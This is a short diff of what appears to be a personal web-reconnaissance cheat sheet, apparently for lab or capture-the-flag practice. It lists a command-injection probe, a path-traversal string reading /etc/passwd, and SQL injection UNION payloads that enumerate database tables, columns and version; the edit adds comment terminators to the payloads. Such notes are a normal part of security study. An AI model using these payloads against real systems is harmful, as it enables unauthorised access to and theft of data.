@@ -33,11 +33,11 @@ Web Recon:
       ; whoami            #if nothing command injection doesnt work :(
       /../../../../../../../../../../../../etc/passwd
       
-    Selection Page:
+    Selection Page: ;#
       Identify vulnerable field, try every field
       Union SELECT 1,2,3<,4,5,6...>
         show what positions in the union statement will be displayed where on the table
-      UNION SELECT table_schema,table_name,column_name FROM information_schema.columns      #GOAT
+      UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #      #GOAT
         Figures out what column are in what table
       UNION SELECT 1,2,@@version
         Displays version #
